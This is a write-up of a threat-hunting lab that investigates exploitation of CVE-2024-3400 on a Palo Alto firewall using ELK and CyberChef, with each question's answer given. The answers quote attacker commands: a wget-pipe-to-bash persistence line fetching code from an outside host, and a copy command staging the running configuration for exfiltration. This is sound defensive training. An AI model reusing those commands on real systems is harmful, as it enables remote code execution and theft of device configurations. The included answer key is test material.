# PaloAltoRCE Lab

**Category:** Threat Hunting

**Scenario:** Palo Alto, a leading firewall vendor, has recently announced a critical vulnerability (CVE-2024-3400) that affects specific versions of its next-generation firewalls. This critical vulnerability enables remote attackers to gain unauthorized access and potentially take full control of affected systems. These firewalls are integral to your organization's network security, as they manage and monitor both inbound and outbound traffic, safeguarding against unauthorized access and various threats.

As a security analyst, your primary task is to accurately and swiftly determine whether any of the organization's systems are impacted by this newly disclosed vulnerability.

**Tools:**
* ELK
* CyberChef

> Q1: Identify the IP address of the first threat actor who gained unauthorized access to the environment.

First, we'll want to query by **message: "failed to unmarshal"** which will help us identify a data format mismatch or a parsing error.

<img width="3392" height="1834" alt="image" src="https://github.com/user-attachments/assets/711db9ef-f82f-4b52-9f3f-7d265e05adfc" />

We then want to check the logs for an encoded payload which we can paste into CyberChef to decode it and look for a reverse shell command.

<img width="3392" height="1786" alt="image" src="https://github.com/user-attachments/assets/28d58404-3559-4fcf-8da7-489e6b870bd0" />

We can see in the output, the IP address of the threat actor is decoded.

<details>
  <summary>Answer</summary>

   ```
   54.162.164.22
   ```

</details>

> Q2: Determine the date and time of the initial interaction between the threat actor and the target system. Format: 24h-UTC

Now that we know the IP address of the threat actor, we can query for logs based on it. We'll want to set the @timestamp from **Oldest-Newest** to see when the first log was recorded.

<img width="3396" height="1834" alt="image" src="https://github.com/user-attachments/assets/10e6b4a6-494f-4ea0-b187-bc3447bb9c8a" />

<details>
  <summary>Answer</summary>

   ```
   2024-04-21 18:17:07
   ```

</details>

> Q3: What is the command the threat actor used to achieve persistence on the machine?

<img width="3396" height="1834" alt="image" src="https://github.com/user-attachments/assets/58a52589-9697-4273-9b12-ad4ae7f000df" />

You can see right on the front interface of the logs that there are bash commands from the root user.


<details>
  <summary>Answer</summary>

   ```
   wget -qO- http://54.162.164.22/update | bash
   ```

</details>

> Q4: What port was the first port used by one of the threat actors for the reverse shell?

Similar to Q1, we'll want to check the logs from some of the first recorded logs to find the first port that was used for the reverse shell.

<img width="3392" height="1834" alt="image" src="https://github.com/user-attachments/assets/0d2640b3-15a8-4e4d-a1c3-9f0a32b63515" />

Once we find the encoded payload, we'll want to insert that into CyberChef.

<img width="3396" height="1782" alt="image" src="https://github.com/user-attachments/assets/3687805f-0807-4f2e-a665-f5a4128b428c" />

We can see the port number after the IP address.

<details>
  <summary>Answer</summary>

   ```
   13337
   ```

</details>

> Q5: What was the name of the file one of the threat actors tried to exfiltrate?

<img width="1904" height="1692" alt="image" src="https://github.com/user-attachments/assets/9b374318-6dab-4fbd-9a7e-efba8e6afabb" />

The command decoded is cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css, and checking the http logs we see 3 404 events for the mentioned file, indicating an attempt to exfiltrate without success.

<img width="2730" height="451" alt="image" src="https://github.com/user-attachments/assets/8dcc93c0-455f-4b47-ad9e-41ebb8affa92" />

<details>
  <summary>Answer</summary>

   ```
   running-config.xml
   ```

</details>

> Q6: What was the full URL the Threat actor used to access the exfiltrated content successfully?

We can query for the threat actor's IP address, the status code 200, and **message:"GET"**. Look for any very long responses in the **response_size** field.

<img width="3396" height="1834" alt="image" src="https://github.com/user-attachments/assets/80bc6248-d59e-4ecd-bda4-cde310c5286a" />

<details>
  <summary>Answer</summary>

   ```
   https://44.217.16.42/global-protect/bootstrap.min.css
   ```

</details>

**Takeaway:**
This threat hunting lab was a great experience, teaching me how to react to a zero-day like CVE-2024-3400. It was fun to reconstruct the attack chain inside the ELK stack. I started by filtering the logs for errors, like "failed to unmarshal", to find the initial hacker's IP and when they first got in. From there, I pivoted to checking their actual commands. I had to use CyberChef to decode their payloads which was important in figuring out the reverse shell port and how they planned to stay persistent on the machine. Finally, by watching the GET requests and looking for 404 errors that turned into successful 200 downloads, I managed to track down the sensitive configuration file they were trying to steal. It gave me a complete, end-to-end picture of the entire intrusion.
